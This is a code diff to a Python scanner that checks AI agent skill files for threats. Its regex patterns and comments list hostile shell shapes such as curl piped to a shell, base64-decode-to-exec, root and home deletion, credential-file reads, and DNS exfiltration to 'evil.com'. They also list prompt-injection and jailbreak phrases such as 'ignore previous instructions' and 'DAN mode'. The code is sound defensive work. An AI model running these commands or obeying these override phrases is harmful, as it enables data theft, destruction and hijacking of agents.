@@ -8,27 +8,35 @@ agent-config files surface only the low *_ref finding — static regexes cannot 
 destination; future coverage belongs as a fourth "mechanical" tier next to agent_config_mod_shell."""
 
 import re
-import fnmatch
+import codecs
 import hashlib
+import io
 import json
+import tokenize
 from contextlib import suppress
 from dataclasses import asdict, dataclass, field
-from datetime import datetime, timezone
+from datetime import datetime, timezone, UTC
 from pathlib import Path
 from typing import List, Tuple
 
+from tools.skills_guard_credentials import SKILL_ONLY_PATTERNS, code_views, raise_provider_key_reads
 
-SCANNER_VERSION = "skills-guard-v6"
+
+SCANNER_VERSION = "skills-guard-v14"
 
 # NVIDIA-verified skills each ship a signed `skill.oms.sig` + governance `skill-card.md`.
-TRUSTED_REPOS = {"openai/skills", "anthropics/skills", "huggingface/skills", "NVIDIA/skills"}
+TRUSTED_REPOS = {
+    "openai/skills", "anthropics/skills", "huggingface/skills", "NVIDIA/skills",
+    "wandb/skills", "qdrant/skills", "pinecone-io/skills",
+    "makenotion/skills", "Airtable/skills", "Shopify/Shopify-AI-Toolkit",
+}
 
 INSTALL_POLICY = {
     #                  safe      caution    dangerous
     "builtin":       ("allow",  "allow",   "allow"),
     "trusted":       ("allow",  "allow",   "block"),
     "community":     ("allow",  "block",   "block"),
-    # "ask" = error to the agent (retry without the flagged content); only when skills.guard_agent_created is on.
+    # "ask" = error to the agent (retry without the flagged content); when guard_agent_created is on or for background review.
     "agent-created": ("allow",  "allow",   "ask"),
 }
 
@@ -52,7 +60,7 @@ class ScanResult:
     source: str
     trust_level: str    # "builtin" | "trusted" | "community" | "agent-created"
     verdict: str        # "safe" | "caution" | "dangerous"
-    findings: List[Finding] = field(default_factory=list)
+    findings: list[Finding] = field(default_factory=list)
     scanned_at: str = ""
     summary: str = ""
     scan_provenance: dict = field(default_factory=dict)
@@ -104,9 +112,9 @@ def _content_contract_re(file_alt: str) -> str:
 
 
 # ── context_exfil helpers ──
-# Negation guard: never/not/doesn't ... right after the verb marks descriptive prose (subagent
-# isolation notes, release notes) — the opposite of a transfer directive.
-_NO_TRANSFER = (r'(?!(?:\w+\s+){0,4}?(?:never|not|doesn\'?t|didn\'?t|won\'?t|isn\'?t|aren\'?t|can\'?t|cannot|mustn\'?t|shouldn\'?t)\b)')
+# Negation guard: never/not/no/doesn't ... right after the verb marks descriptive prose (subagent
+# isolation notes, release notes, "share no context") — the opposite of a transfer directive.
+_NO_TRANSFER = (r'(?!(?:\w+\s+){0,4}?(?:never|not|no|doesn\'?t|didn\'?t|won\'?t|isn\'?t|aren\'?t|can\'?t|cannot|mustn\'?t|shouldn\'?t)\b)')
 # Real directives are short; unbounded filler let prose (output never enters your own context)
 # and feature descriptions match.
 _SHORT_FILLER = r'(?:\w+\s+){0,3}?'
@@ -119,9 +127,24 @@ _NOT_DELEGATE = (
     r'|(?:(?:the|your|each|every|all|to|a)\s+)(?:workers?|delegates?|children|child)\b)'
 )
 
+# A bare ``context`` target is exfil ONLY when it is the agent's own CONVERSATION context — named with
+# a scope qualifier (``your``/``the full``/``entire``/``conversation`` …) — or has an explicit
+# destination (``send child context to the operator``), or is handed to a named external recipient in a
+# DATIVE (``send delegates the context``: ``<recipient>s the/a context``). Disclosure/feature prose
+# describing a NARROWER, plugin-scoped context (``send additional context``, ``send only the narrow
+# context``, ``plugin-send context``) names no conversation scope, destination or recipient-dative, so it
+# does not match. ``_NOT_DELEGATE`` still excludes the agent's OWN subagents/workers/delegates.
+_CTX_SCOPE = (
+    r'(?:your|their|our|its|the\s+(?:full|entire|whole|complete|current)'
+    r'|full|entire|whole|complete|current|conversation|session|chat)\s+')
+_CTX_DEST = r'(?:\s+(?:to|at|with)\b)'
+_CTX_DATIVE = r'(?:[a-z]+s\s+)(?:the|a|an)\s+context\b'
+
 # POSIX shell names as one shared alternation, so every pipe-to-shell pattern below flags the
 # same set (the narrower `(ba)?sh` let `curl url | zsh` through while bash/sh were caught).
-_SHELL_NAMES_RE = r'(?:bash|sh|zsh|ksh|dash)'
+# Word-bounded: `| sha256sum -c` / `| shasum` / `| dashboard` are not `| sh` / `| dash`.
+_SHELL_NAMES_RE = r'(?:bash|sh|zsh|ksh|dash)\b'
+_SUDO_PREFIX = r'(?:sudo\s+(?:-\S+\s+)*)?'
 
 # Known credential-file paths as one shared alternation for the JavaScript and Python
 # read-secrets patterns (a private key, .env, credentials, .netrc, .pgpass, .npmrc, .pypirc;
@@ -131,6 +154,19 @@ _CRED_FILE = r'(?:\.ssh[/\\]id_(?:rsa|ed25519|ecdsa|dsa)(?!\.pub)|\.env\b|creden
 # `os.path.expanduser(...)` (Python only).
 _CRED_FILE_LITERAL = r'["\'][^"\'\n]*' + _CRED_FILE + r'[^"\'\n]*["\']'
 _PY_CRED_FILE_ARG = r'(?:os\.path\.expanduser\s*\(\s*)?' + _CRED_FILE_LITERAL + r'\s*\)?'
+# Well-known PUBLIC Solana program ids (SPL Token, Token-2022, Associated Token Account, Memo,
+# System, Metaplex Token Metadata). On-chain code addresses every client hardcodes, so a
+# `TOKEN = '<id>'` constant names a program, it does not embed a credential. A CLOSED list, matched
+# case-sensitively as the WHOLE quoted value: this can only turn a hardcoded_secret flag into clean
+# for these exact ids; any other value, or one of these with a character changed, still matches.
+_PUBLIC_SOLANA_PROGRAM_IDS = r'(?-i:' + '|'.join((
+    'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA',
+    'TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb',
+    'ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL',
+    'MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr',
+    '11111111111111111111111111111111',
+    'metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s',
+)) + r')'
 
 THREAT_PATTERNS = [
     # ── Exfiltration: shell commands leaking secrets ──
@@ -176,7 +212,12 @@ THREAT_PATTERNS = [
      + r'|\bPath\s*\(\s*' + _PY_CRED_FILE_ARG + r'\s*\)\.(?:read_text|read_bytes|readlines|readline)\s*\(',
      "py_read_secrets_file", "critical", "exfiltration", "Python reads a known credential file"),
     # ── Exfiltration: programmatic env access ──
-    (r'printenv|env\s*\|', "dump_all_env", "high", "exfiltration", "dumps all environment variables"),
+    # ``env |`` must be a shell pipe to a COMMAND. A left boundary drops the ``env`` tail of
+    # ``virtualenv|venv`` in a regex word-list; ``(?!\|)`` drops JS ``env ||`` (logical or); and
+    # ``(?!\s*[{(])`` drops Python ``env | {...}`` (dict merge) and ``env | (...)``. ``printenv``
+    # is unambiguous and keeps no neighbour guard.
+    (r'printenv|(?<![A-Za-z0-9_])env\s*\|(?!\|)(?!\s*[{(])',
+     "dump_all_env", "high", "exfiltration", "dumps all environment variables"),
     # Bare `os.environ` (dump/iteration) is suspicious; ANY `.get("<name>")` form is exempt — plain config
     # reads, with secret-shaped names scored medium by python_environ_get_secret below (a blanket high here
     # would swamp that). `^[^#\n]*` skips lines with a '#' anywhere before it (full-line or inline comment);
@@ -195,20 +236,39 @@ THREAT_PATTERNS = [
     # optional -flags with values, +opts, @server) carries the interpolation. Anything
     # looser fires on the English noun in prose ("set the host value and run
     # `${SKILL_DIR}/x`") and on flag names such as llama.cpp `--host 127.0.0.1 --port $PORT`.
-    (r'(?<![-/])\b(dig|nslookup|host)\s+(?:[-+@]\S*(?:\s+[^\s$"\'-][^\s$]*)?\s+)*["\']?[^\s"\'$]*\$',
+    # `host` is also an English noun and an HTTP header, so it needs the exfil shape itself —
+    # an interpolation INSIDE a domain name (`host $(whoami).evil.com`, `host ${D}.x.io`) — or a
+    # shell command position (`; host $NAME`, `do host $c`); "the connected host (${id})", a JS
+    # `host ${resp.status}: …` message and nginx `Host $host;` are none of those.
+    # Exfil puts the data in the queried NAME as a SUBDOMAIN of an attacker domain: an interpolation
+    # followed by a ``.tld`` suffix (``dig $(whoami).evil.com``, ``nslookup ${d}.x.io``). A plain lookup
+    # of a user-entered host — ``dig +short A ${name}`` in a feed reader, ``getent ahostsv4 ${name}`` —
+    # has the variable as the WHOLE name with no appended domain, and does not match. ``host`` is also
+    # an English noun / HTTP header, so it keeps the stricter domain-interpolation or command-position
+    # requirement (``the connected host (${id})``, ``host ${status}:``, nginx ``Host $host;`` miss).
+    (r'(?<![-/])\b(?:dig|nslookup)\s+(?:[-+@]\S*(?:\s+[^\s$"\'-][^\s$]*)?\s+)*["\']?[^\s"\'$()]*'
+     r'\$(?:\{[^}\s]*\}|\([^\n]*?\)+|\w+)[\w-]*["\']?\.[a-z]'
+     r'|(?<![-/])\bhost\s+(?:[-+@]\S*(?:\s+[^\s$"\'-][^\s$]*)?\s+)*["\']?[^\s"\'$()]*'
+     r'\$(?:\{[^}\s]*\}|\([^\n]*?\)+|\w+)[\w-]*\.[a-z]'
+     r'|(?:^|[;&|]|\$\(|\b(?:do|then|else)\b)\s*host\s+(?:[-+@]\S*(?:\s+[^\s$"\'-][^\s$]*)?\s+)*["\']?\$',
      "dns_exfil", "critical", "exfiltration", "DNS lookup with variable interpolation (possible DNS exfiltration)"),
     (r'>\s*/tmp/[^\s]*\s*&&\s*(curl|wget|nc|python)',  # no-tmp: ok — malicious-pattern regex
      "tmp_staging", "critical", "exfiltration", "writes to /tmp then exfiltrates"),  # no-tmp: ok — malicious-pattern label
     # ── Exfiltration: markdown/link based ──
     (r'!\[.*\]\(https?://[^\)]*\$\{?',
      "md_image_exfil", "high", "exfiltration", "markdown image URL with variable interpolation (image-based exfil)"),
-    (r'\[.*\]\(https?://[^\)]*\$\{?', "md_link_exfil", "high", "exfiltration", "markdown link with variable interpolation"),
+    # `[^\[]*`, not `.*`: a match exists iff the LAST `[` before `](` matches, so this is the same
+    # set of lines in one pass. `.*` retried every `]` from every `[` (quadratic on minified JSON).
+    (r'\[[^\[]*\]\(https?://[^\)]*\$\{?', "md_link_exfil", "high", "exfiltration", "markdown link with variable interpolation"),
     # ── Prompt injection ──
     (r'ignore\s+(?:\w+\s+)*(previous|all|above|prior)\s+instructions',
      "prompt_injection_ignore", "critical", "injection", "prompt injection: ignore previous instructions"),
     (r'you\s+are\s+(?:\w+\s+)*now\s+', "role_hijack", "high", "injection", "attempts to override the agent's role"),
-    # Concealment only — the lookahead exempts UX guidance ("don't tell the user X unless Y confirms").
-    (r'do\s+not\s+(?:\w+\s+)*tell\s+(?:\w+\s+)*the\s+user(?!.*\b(?:unless|except|until|confirm|diagnose|verify|check)\b)',
+    # Concealment only — the lookahead exempts UX guidance ("don't tell the user X unless Y confirms")
+    # and a tone rule that QUOTES the phrase the agent should not say (`Do not tell the user to
+    # "be careful with terminal."`); an unquoted `to ...` is still an instruction and fires.
+    (r'do\s+not\s+(?:\w+\s+)*tell\s+(?:\w+\s+)*the\s+user(?!\s+to\s+["\'\u201c\u2018])'
+     r'(?!.*\b(?:unless|except|until|confirm|diagnos\w*|verify|check)\b)',
      "deception_hide", "high", "injection", "instructs agent to hide information from user"),
     (r'system\s+(?:\w+\s+)*prompt\s+(?:\w+\s+)*override',
      "sys_prompt_override", "critical", "injection", "attempts to override the system prompt"),
@@ -224,20 +284,36 @@ THREAT_PATTERNS = [
      "bypass_restrictions", "critical", "injection", "instructs agent to act without restrictions"),
     (r'translate\s+.*\s+into\s+.*\s+and\s+(execute|run|eval)',
      "translate_execute", "critical", "injection", "translate-then-execute evasion technique"),
-    (r'<!--[^>]*(?:ignore|override|system|secret|hidden)[^>]*-->',
+    # Injection phrasing inside the comment, not a bare keyword: `<!-- Original size, ignore container -->`
+    # and `<!-- Requires SYSTEM_ALERT_WINDOW -->` are layout/doc notes.
+    (r'<!--[^>]*(?:\b(?:ignore|forget|disregard|override)\s+(?:\w+\s+)*?'
+     r'(?:previous|prior|above|earlier|all|any|your|the)\s+(?:\w+\s+)*?'
+     r'(?:instructions?|rules|prompts?|guidelines|directions|restrictions)'
+     r'|\bsystem\s*(?:prompt|message|instructions?|override)|\b(?:override|secret|hidden|system)\s*:'
+     r'|\b(?:ignore|override|bypass|disable)\s+(?:\w+\s+)*?(?:safety|security|guardrails|filters)\b'
+     r'|\b(?:secret|hidden|new)\s+(?:instructions?|commands?|directives?|tasks?)\b|\byou\s+are\s+now\b'
+     r'|\bdo\s+not\s+(?:tell|reveal|show|mention|inform)\b'
+     r'|\b(?:note|message)\s+(?:to|for)\s+(?:the\s+)?(?:ai|agent|assistant|model|llm)\b)[^>]*-->',
      "html_comment_injection", "high", "injection", "hidden instructions in HTML comments"),
     (r'<\s*div\s+style\s*=\s*["\'][\s\S]*?display\s*:\s*none',
      "hidden_div", "high", "injection", "hidden HTML div (invisible instructions)"),
     # ── Destructive operations ──
     # Cleanup under the standard temp roots (/tmp, /var/tmp, /dev/shm, /run) is routine in
-    # test/smoke scripts and CI. A parent segment inside an exempted root can escape it,
-    # so it remains destructive along with every other path rooted at "/".
-    (r'rm\s+-rf\s+/(?:'
-     r'(?!tmp(?:\b|/)|var/tmp(?:\b|/)|dev/shm(?:\b|/)|run(?:\b|/))'
-     r'|(?:tmp|var/tmp|dev/shm|run)/(?:[^/\s]*/)*\.\.(?=/|[\s;&|]|$))',
+    # test/smoke scripts and CI, and so is the package-cache cleanup that ends every Dockerfile
+    # install layer (`rm -rf /var/lib/apt/lists/*`, /var/cache/{apt,apk,yum,dnf}). A parent
+    # segment inside an exempted root can escape it, so it remains destructive along with every
+    # other path rooted at "/". Every operand is checked (`rm -rf /tmp/x /etc`,
+    # `rm -rf --no-preserve-root /`), not only the first. A later bare `//` token is a JS/JSONC
+    # comment opener (`"rm -rf dist", // clean`), not the root; operands after it are still
+    # checked (`rm -rf x // /etc` deletes /etc in a shell). A first-operand `//` is the root.
+    (r'rm\s+-rf\s+((?:[^\s;&|<>#][^\s;&|<>]*\s+)+?)?/(?(1)(?!/(?:\s|$)))(?:'
+     r'(?!(?:tmp|var/tmp|dev/shm|run|var/lib/apt/lists|var/cache/(?:apt|apk|yum|dnf))(?:\b|/))'
+     r'|(?:tmp|var/tmp|dev/shm|run|var/lib/apt/lists|var/cache/(?:apt|apk|yum|dnf))/(?:[^/\s]*/)*\.\.(?=/|[\s;&|]|$))',
      "destructive_root_rm", "critical", "destructive", "recursive delete from root"),
-    (r'rm\s+(-[^\s]*)?r.*\$HOME|\brmdir\s+.*\$HOME',
-     "destructive_home_rm", "critical", "destructive", "recursive delete targeting home directory"),
+    # ``rm`` / ``rmdir`` need a left boundary that excludes letters/digits: without it the ``rm`` in
+    # English prose (``the platfoRM rOute to ~/.hermes/config.yaml``) matched a recursive home delete.
+    (r'(?<![A-Za-z0-9])rm\s+(-[^\s]*)?r.*(?:\$HOME|~[/\s*]|~$)|(?<![A-Za-z0-9])rmdir\s+.*(?:\$HOME|~[/\s*]|~$)',
+     "destructive_home_rm", "critical", "destructive", "recursive delete targeting home directory ($HOME or ~)"),
     (r'chmod\s+777', "insecure_perms", "medium", "destructive", "sets world-writable permissions"),
     (r'>\s*/etc/', "system_overwrite", "critical", "destructive", "overwrites system configuration file"),
     (r'\bmkfs\b', "format_filesystem", "critical", "destructive", "formats a filesystem"),
@@ -283,11 +359,29 @@ THREAT_PATTERNS = [
     (r'pastebin\.com|hastebin\.com|ghostbin\.',
      "paste_service", "medium", "network", "references paste service (possible data staging)"),
     # ── Obfuscation: encoding and eval ──
-    (r'base64\s+(-d|--decode)\s*\|', "base64_decode_pipe", "high", "obfuscation", "base64 decodes and pipes to execution"),
+    # The decode may read a file or a redirect before the pipe (`base64 -d payload.b64 | sh`,
+    # `base64 --decode < p | sh`), short flags may be combined (`-di`), and openssl decodes base64
+    # too. Execution means an interpreter in command position at ANY later stage of the line
+    # (`| gunzip | sh`, `| tee x.sh; sh x.sh`), or an archive unpacker: an embedded base64 tarball
+    # (`tail "$0" | base64 -d | tar x`) is code the scanner never sees. Decoding into a data consumer
+    # (`| jq .`, `| grep`) is not. A base64 ENCODE→DECODE round-trip of a freshly-created archive over a
+    # transport (`tar c… | base64 … | base64 -d | tar x`) is data movement, demoted in plugin_guard_context.
+    (r'(?:\bbase64\s+(?:-[^\s|]+\s+)*?(?:-[a-z]*d[a-z]*|--decode)\b|\bopenssl\s+(?:base64|enc)\b[^|;&\n]*?\s-d\b)'
+     r'[^\n]*?(?:\||;|&&)\s*(?:\w+=\S*\s+)*(?:\S*/)?'
+     r'(?:sh|bash|zsh|ksh|dash|fish|python[\d.]*|perl|ruby|node|nodejs|php|eval|source|exec|xargs|env|sudo'
+     r'|iex|pwsh|powershell|tar|bsdtar|unzip|cpio|gunzip|gzip|zcat|xz|unxz|bunzip2|\.(?=\s))(?![\w.-])'
+     r'|\b(?:eval|source|iex|exec)\b[^\n]*\bbase64\s+(?:-[^\s|]+\s+)*?(?:-[a-z]*d[a-z]*|--decode)\b',
+     "base64_decode_pipe", "high", "obfuscation", "base64 decodes and pipes to execution"),
     (r'\\x[0-9a-fA-F]{2}.*\\x[0-9a-fA-F]{2}.*\\x[0-9a-fA-F]{2}',
      "hex_encoded_string", "medium", "obfuscation", "hex-encoded string (possible obfuscation)"),
     (r'\beval\s*\(\s*["\']', "eval_string", "high", "obfuscation", "eval() with string argument"),
-    (r'\bexec\s*\(\s*["\']', "exec_string", "high", "obfuscation", "exec() with string argument"),
+    # An upper-case SQL statement is a database call (`db.exec('PRAGMA busy_timeout=2000')`,
+    # node:sqlite / better-sqlite3), never code or a shell command line.
+    # A method named ``exec`` on an object (``sandbox.exec("tar", ...)``, a Docker/sandbox SDK argv call)
+    # is not the Python ``exec()`` builtin running a code string, so require no ``.``/word char before ``exec``.
+    (r'(?<![.\w])exec\s*\(\s*["\'](?!(?-i:PRAGMA|BEGIN|COMMIT|ROLLBACK|CREATE|INSERT|SELECT|UPDATE|DELETE|DROP|ALTER'
+     r'|VACUUM|SAVEPOINT|RELEASE|ANALYZE|REINDEX|ATTACH|DETACH|REPLACE)\b)',
+     "exec_string", "high", "obfuscation", "exec() with string argument"),
     (rf'echo\s+[^\n]*\|\s*(?:{_SHELL_NAMES_RE}|python|perl|ruby|node)',
      "echo_pipe_exec", "critical", "obfuscation", "echo piped to interpreter for execution"),
     (r'compile\s*\(\s*[^\)]+,\s*["\'].*["\']\s*,\s*["\']exec["\']\s*\)',
@@ -313,6 +407,14 @@ THREAT_PATTERNS = [
     (r'child_process\.(exec|spawn|fork)\s*\(', "node_child_process", "high", "execution", "Node.js child_process execution"),
     (r'Runtime\.getRuntime\(\)\.exec\(', "java_runtime_exec", "high", "execution", "Java Runtime.exec() — shell execution"),
     (r'`[^`]*\$\([^)]+\)[^`]*`', "backtick_subshell", "medium", "execution", "backtick string with command substitution"),
+    # Inline-shell auto-exec DSL: `` !`cmd` `` snippets in SKILL.md bodies are expanded via
+    # `bash -c` on skill view/load when `skills.inline_shell` is enabled (#63307). Flag the
+    # vector so reviewers inspect the command before trusting an opt-in that arms every
+    # installed skill at once. Requires a non-space payload so an empty `` !` ` `` marker
+    # (a skill explaining the DSL itself) is not flagged.
+    (r'!`[^`\s][^`\n]*`',
+     "inline_shell_exec", "high", "execution",
+     "inline-shell auto-exec snippet (expands via bash -c on skill view/load)"),
     # ── Path traversal ──
     (r'\.\./\.\./\.\.', "path_traversal_deep", "high", "traversal", "deep relative path traversal (3+ levels up)"),
     (r'\.\./\.\.', "path_traversal", "medium", "traversal", "relative path traversal (2+ levels up)"),
@@ -323,10 +425,14 @@ THREAT_PATTERNS = [
     (r'xmrig|stratum\+tcp|monero|coinhive|cryptonight', "crypto_mining", "critical", "mining", "cryptocurrency mining reference"),
     (r'hashrate|nonce.*difficulty', "mining_indicators", "medium", "mining", "possible cryptocurrency mining indicators"),
     # ── Supply chain: curl/wget pipe to shell ──
-    (rf'curl\s+[^\n]*\|\s*{_SHELL_NAMES_RE}', "curl_pipe_shell", "critical", "supply_chain", "curl piped to shell (download-and-execute)"),
-    (rf'wget\s+[^\n]*-O\s*-\s*\|\s*{_SHELL_NAMES_RE}',
+    # `curl` needs an operand before the pipe (#118155): the bare phrase `curl | sh` is prose shorthand for the
+    # install method, and curl with no URL fetches nothing. A real download-and-execute names its source, so
+    # requiring one non-pipe character after the command costs no coverage.
+    # `| sudo -E bash` is the same download-and-execute, with root.
+    (rf'curl\s+[^|\s][^\n]*\|\s*{_SUDO_PREFIX}{_SHELL_NAMES_RE}', "curl_pipe_shell", "critical", "supply_chain", "curl piped to shell (download-and-execute)"),
+    (rf'wget\s+[^\n]*-O\s*-\s*\|\s*{_SUDO_PREFIX}{_SHELL_NAMES_RE}',
      "wget_pipe_shell", "critical", "supply_chain", "wget piped to shell (download-and-execute)"),
-    (r'curl\s+[^\n]*\|\s*python', "curl_pipe_python", "critical", "supply_chain", "curl piped to Python interpreter"),
+    (rf'curl\s+[^|\s][^\n]*\|\s*{_SUDO_PREFIX}python', "curl_pipe_python", "critical", "supply_chain", "curl piped to Python interpreter"),
     # ── Supply chain: unpinned/deferred dependencies ──
     (r'#\s*///\s*script.*dependencies',
      "pep723_inline_deps", "medium", "supply_chain", "PEP 723 inline script metadata with dependencies (verify pinning)"),
@@ -346,10 +452,20 @@ THREAT_PATTERNS = [
     # `sudo.request` / `sudo.respond` are gateway wire events (the masked sudo-password prompt), not an
     # invocation: any client plugin that relays Hermes' secure prompts has to name them, and a bare
     # `\bsudo\b` made every such plugin `caution`. A dotted event name is never a shell `sudo`.
-    (r'\bsudo\b(?!\.(?:request|respond)\b)',
+    # ``sudo.request`` / ``sudo.respond`` / ``sudo.expire`` are gateway wire events (the masked
+    # sudo-password prompt lifecycle), not an invocation: any client plugin that relays Hermes' secure
+    # prompts has to name them, and a bare ``\bsudo\b`` made every such plugin ``caution``. A dotted
+    # event name (``sudo.<verb>``) is never a shell ``sudo``.
+    (r'\bsudo\b(?!\.\w)',
      "sudo_usage", "high", "privilege_escalation", "uses sudo (privilege escalation)"),
-    (r'setuid|setgid|cap_setuid',
+    # Critical only in an executing shape: a set*id() call, the cap_setuid/cap_setgid capability, or a
+    # chmod setting the bit (`u+s`, `g=s`, octal 2xxx-7xxx). The bare word is prose ("no setuid
+    # attributes") or a flag name (`--disable-setuid-sandbox`): an informational note.
+    (r'(?<![a-z])set(?:e|re|res)?[ug]id\s*\(|\bcap_set[ug]id\b'
+     r'|\bchmod\s+(?:-\w+\s+)*(?:[ugoa]*[+=][rwxXt]*s|0?[2-7][0-7]{3}\b)',
      "setuid_setgid", "critical", "privilege_escalation", "setuid/setgid (privilege escalation mechanism)"),
+    (r'(?<!cap_)set[ug]id(?!\s*\()',
+     "setuid_setgid", "medium", "privilege_escalation", "mentions setuid/setgid (informational)"),
     (r'NOPASSWD',
      "nopasswd_sudo", "critical", "privilege_escalation", "NOPASSWD sudoers entry (passwordless privilege escalation)"),
     (r'chmod\s+[u+]?s', "suid_bit", "critical", "privilege_escalation", "sets SUID/SGID bit on a file"),
@@ -391,17 +507,23 @@ THREAT_PATTERNS = [
     # segment keeps underscore-free all-caps credentials (AWS AKIA…, base32) matched.
     (r'(?:api[_-]?key|token|secret|password)\s*[=:]\s*["\']'
      r'(?!(?-i:[A-Z][A-Z0-9]*(?:_[A-Z0-9]+)+)["\'])'
+     r'(?!' + _PUBLIC_SOLANA_PROGRAM_IDS + r'["\'])'
      r'[A-Za-z0-9+/=_-]{20,}',
      "hardcoded_secret", "critical", "credential_exposure", "possible hardcoded API key, token, or secret"),
-    (r'-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----',
+    (r'(?-i:-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----)',
      "embedded_private_key", "critical", "credential_exposure", "embedded private key"),
-    (r'ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{80,}',
+    # Provider token shapes are case-fixed (`ghp_`, `sk-`, `glpat-`, `AKIA`) and the table compiles
+    # with IGNORECASE, so each one is scoped case-sensitive like the AWS pattern below.
+    (r'(?-i:ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{80,})',
      "github_token_leaked", "critical", "credential_exposure", "GitHub personal access token in skill content"),
-    (r'sk-[A-Za-z0-9]{20,}', "openai_key_leaked", "critical", "credential_exposure", "possible OpenAI API key in skill content"),
-    (r'sk-ant-[A-Za-z0-9_-]{90,}',
+    (r'(?-i:sk-[A-Za-z0-9]{20,})', "openai_key_leaked", "critical", "credential_exposure", "possible OpenAI API key in skill content"),
+    (r'(?-i:sk-ant-[A-Za-z0-9_-]{90,})',
      "anthropic_key_leaked", "critical", "credential_exposure", "possible Anthropic API key in skill content"),
-    (r'AKIA[0-9A-Z]{16}', "aws_access_key_leaked", "critical", "credential_exposure", "AWS access key ID in skill content"),
-    (r'glpat-[A-Za-z0-9_\-]{20,}',
+    # AWS access key IDs are all-caps by spec. Scoped case-sensitive — the table compiles with
+    # IGNORECASE, and a case-folded AKIA+16 inside a base64-encoded asset is a byte collision,
+    # not a key (#132155); one such false critical hard-blocks the whole plugin install.
+    (r'(?-i:AKIA[0-9A-Z]{16})', "aws_access_key_leaked", "critical", "credential_exposure", "AWS access key ID in skill content"),
+    (r'(?-i:glpat-[A-Za-z0-9_\-]{20,})',
      "gitlab_token_leaked", "critical", "credential_exposure", "GitLab personal access token in skill content"),
     # ── Additional prompt injection: jailbreak patterns ──
     (r'\bDAN\s+mode\b|Do\s+Anything\s+Now', "jailbreak_dan", "critical", "injection", "DAN (Do Anything Now) jailbreak attempt"),
@@ -424,7 +546,8 @@ THREAT_PATTERNS = [
     # only under transfer verbs (print/send/share) — "include context" is window/information talk —
     # and not when the recipient is the agent's own subagent (delegation prose).
     (rf'\b(?:include|output|print|send|share)\s+{_NO_TRANSFER}{_SHORT_FILLER}(?:conversation|chat\s+history|previous\s+messages)\b'
-     rf'|\b(?:print|send|share)\s+{_NO_TRANSFER}{_NOT_DELEGATE}{_SHORT_FILLER}context\b',
+     rf'|\b(?:print|send|share|output|upload|transmit)\s+{_NO_TRANSFER}{_NOT_DELEGATE}'
+     rf'(?:(?:\w+\s+){{0,2}}?{_CTX_SCOPE}(?:\w+\s+){{0,2}}?context\b|(?:\w+\s+){{0,3}}?context\b{_CTX_DEST}|{_CTX_DATIVE})',
      "context_exfil", "high", "exfiltration", "instructs agent to output/share conversation history"),
     (r'(send|post|upload|transmit)\s+.*\s+(to|at)\s+https?://',
      "send_to_url", "high", "exfiltration", "instructs agent to send data to a URL"),
@@ -474,7 +597,7 @@ def _statement_owners(lines: list) -> list:
 
 
 def _demote_inert_path_reference(pid: str, severity: str, description: str, line: str, owner_line: str,
-                                 suffix: str) -> Tuple[str, str]:
+                                 suffix: str) -> tuple[str, str]:
     """``(severity, description)`` for a path-token match, lowered when the line cannot act where it sits."""
     if pid not in _PATH_REFERENCE_PATTERN_IDS:
         return severity, description
@@ -512,18 +635,37 @@ def _unicode_char_name(char: str) -> str:
     return _INVISIBLE_CHAR_NAMES.get(char, f"U+{ord(char):04X}")
 
 
+# A STRING token opens a triple-quoted block after at most a two-char prefix (r/b/f combos).
+_TRIPLE_QUOTE_OPEN_RE = re.compile(r'^[A-Za-z]{0,2}(?:"""|\'\'\')')
+# 3.12+ splits f-strings into FSTRING_START/MIDDLE/END tokens; only the quote delimiters are prose.
+_FSTRING_START, _FSTRING_MIDDLE, _FSTRING_END = (
+    getattr(tokenize, name, None) for name in ("FSTRING_START", "FSTRING_MIDDLE", "FSTRING_END"))
+_FSTRING_BOUNDARY_TYPES = {t for t in (_FSTRING_START, _FSTRING_END) if t is not None}
+
+
 def _compute_docstring_lines(lines: list) -> set:
     """1-indexed lines inside or on the boundary of triple-quoted strings (opening, interior, closing, and
-    one-line docstrings), so ``os.environ`` in prose is not scored. Heuristic: a triple quote inside a string
-    literal is miscounted, but the common false-positive shapes are covered."""
+    one-line docstrings), so ``os.environ`` in prose is not scored. Computed structurally from Python-lexer
+    tokens rather than quote counting: one unbalanced triple quote used to toggle the counter and let a
+    bundle author mark arbitrary payload lines as prose. Any lexer failure fails closed — no line is
+    exempted, so every pattern still runs. Callers scope the skip to ``_DOCSTRING_EXEMPT_PATTERN_IDS``."""
     doc_lines: set = set()
-    inside = False
-    for i, line in enumerate(lines, start=1):
-        was_in, counts = inside, [line.count(marker) for marker in ('"""', "'''")]
-        inside ^= sum(counts) % 2 == 1  # each odd marker count toggles; two odd counts cancel
-        if was_in or inside or any(counts):
-            doc_lines.add(i)
-    return doc_lines
+    fstrings: list = []  # open f-strings (3.12+), True when triple-quoted
+    expr_lines: set = set()  # lines holding a ``{...}`` expression: code, never prose
+    try:
+        for tok in tokenize.generate_tokens(io.StringIO('\n'.join(lines)).readline):
+            if tok.type == _FSTRING_START:
+                fstrings.append(bool(_TRIPLE_QUOTE_OPEN_RE.match(tok.string)))
+            elif tok.type == _FSTRING_END and fstrings:
+                fstrings.pop()
+            if ((tok.type == tokenize.STRING or tok.type in _FSTRING_BOUNDARY_TYPES)
+                    and _TRIPLE_QUOTE_OPEN_RE.match(tok.string)) or tok.type == _FSTRING_MIDDLE and fstrings and fstrings[-1]:
+                doc_lines.update(range(tok.start[0], tok.end[0] + 1))
+            elif fstrings and tok.type not in _FSTRING_BOUNDARY_TYPES and tok.type != _FSTRING_MIDDLE:
+                expr_lines.update(range(tok.start[0], tok.end[0] + 1))
+    except (tokenize.TokenError, SyntaxError):  # unparsable input must never silence the pattern passes
+        return set()
+    return doc_lines - expr_lines
 
 
 def _mask_markdown_link_destinations(line: str) -> str:
@@ -569,13 +711,13 @@ _FENCE_LINE = re.compile(r"^ {0,3}(?P<marker>`{3,}|~{3,})(?P<info>.*)$")
 _CONTAINER_PREFIX = re.compile(r"^(?: {0,3}(?:>|(?:[-*+]|\d{1,9}[.)]) {1,4}))+")
 
 
-def _mask_prose_link_destinations(lines: List[str]) -> List[str]:
